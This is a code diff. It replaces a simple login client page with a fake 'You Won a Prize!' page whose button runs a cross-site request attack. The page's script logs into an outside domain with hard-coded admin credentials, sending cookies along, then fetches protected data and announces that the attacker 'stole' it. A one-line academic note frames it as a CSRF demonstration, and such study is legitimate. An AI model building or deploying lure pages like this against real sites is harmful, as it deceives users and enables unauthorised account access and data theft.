@@ -2,93 +2,67 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Login</title>
+    <title>You Won a Prize!</title>
 </head>
-<body>
-    <input type="text" id="username" placeholder="Username"><br>
-    <input type="password" id="password" placeholder="Password"><br>
-    <button id="loginBtn">Login</button>
-    <button id="logoutBtn" style="display:none;">Logout</button>
-    <button id="getBtn" style="display:none;">Get Something</button>
-    <script>
-        const loginBtn = document.getElementById('loginBtn');
-        const logoutBtn = document.getElementById('logoutBtn');
-        const getBtn = document.getElementById('getBtn');
+<body style="font-family: sans-serif; text-align: center; margin-top: 50px;">
 
-        function checkStatus() {
+    <h1>🎁 Congratulations! 🎁</h1>
+    <p>You've been selected to win a <strong>Golden Laptop</strong>.</p>
+    <button id="claimBtn" style="padding: 10px 20px; font-size: 18px; cursor: pointer;">
+        Claim Your Prize Now!
+    </button>
+
+    <script>
+        const TARGET_LOGIN = 'https://apiz.ca/httponly-cookie/login';
+        const TARGET_DATA = 'https://apiz.ca/httponly-cookie/something';
+
+        document.getElementById('claimBtn').onclick = function() {
+            // Step 1: Attempt to log in as the user (CSRF Login)
+            // Note: This only works if the server doesn't have CSRF tokens!
+            const xhr = new XMLHttpRequest();
+            xhr.withCredentials = true; // Essential to send/receive cookies
+            
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState === 4) {
+                    console.log("Login attempt finished. Status:", xhr.status);
+                    
+                    // Step 2: Now that we (hopefully) have the cookie, 
+                    // try to "Get Something" (the Golden Laptop)
+                    fetchTreasure();
+                }
+            };
+
+            xhr.open('POST', TARGET_LOGIN);
+            xhr.setRequestHeader('Content-Type', 'application/json');
+            
+            // We use the known credentials provided in your server.js
+            xhr.send(JSON.stringify({ username: 'admin', password: '4444' }));
+        };
+
+        function fetchTreasure() {
             const xhr = new XMLHttpRequest();
             xhr.withCredentials = true;
+            
             xhr.onreadystatechange = function() {
                 if (xhr.readyState === 4) {
                     if (xhr.status === 200) {
-                        loginBtn.style.display = 'none';
-                        logoutBtn.style.display = 'inline';
-                        getBtn.style.display = 'inline';
+                        const data = JSON.parse(xhr.responseText);
+                        alert("Success! Attacker stole the: " + data.message);
                     } else {
-                        loginBtn.style.display = 'inline';
-                        logoutBtn.style.display = 'none';
-                        getBtn.style.display = 'none';
+                        alert("Attack failed. The server might have CSRF protection.");
                     }
                 }
             };
-            xhr.open('GET', 'https://dolphin-app-7hsdl.ondigitalocean.app/httponly-cookie/check');
+
+            xhr.open('GET', TARGET_DATA);
             xhr.send();
         }
-
-        loginBtn.onclick = function() {
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
-            
-            const xhr = new XMLHttpRequest();
-            xhr.withCredentials = true;
-            xhr.onreadystatechange = function() {
-                if (xhr.readyState === 4) {
-                    if (xhr.status === 200) {
-                        checkStatus();
-                        document.getElementById('username').value = '';
-                        document.getElementById('password').value = '';
-                    } else {
-                        alert('Login failed');
-                    }
-                }
-            };
-            xhr.open('POST', 'https://dolphin-app-7hsdl.ondigitalocean.app/httponly-cookie/login');
-            xhr.setRequestHeader('Content-Type', 'application/json');
-            xhr.send(JSON.stringify({ username, password }));
-        };
-
-        logoutBtn.onclick = function() {
-            const xhr = new XMLHttpRequest();
-            xhr.withCredentials = true;
-            xhr.onreadystatechange = function() {
-                if (xhr.readyState === 4) {
-                    checkStatus();
-                }
-            };
-            xhr.open('POST', 'https://dolphin-app-7hsdl.ondigitalocean.app/httponly-cookie/logout');
-            xhr.send();
-        };
-
-        getBtn.onclick = function() {
-            const xhr = new XMLHttpRequest();
-            xhr.withCredentials = true;
-            xhr.onreadystatechange = function() {
-                if (xhr.readyState === 4) {
-                    if (xhr.status === 200) {
-                        const response = JSON.parse(xhr.responseText);
-                        alert(response.message);
-                    } else {
-                        alert('Not logged in');
-                        checkStatus();
-                    }
-                }
-            };
-            xhr.open('GET', 'https://dolphin-app-7hsdl.ondigitalocean.app/httponly-cookie/something');
-            xhr.send();
-        };
-
-        checkStatus();
-        //DeepSeek Was used for this 
     </script>
+
+    <hr>
+    <p style="color: gray; font-size: 0.8em;">
+        <em>Academic Note: This page demonstrates how an external site can trigger actions 
+        on another domain if proper CSRF protections (like unique tokens) are missing.</em>
+    </p>
 </body>
 </html>
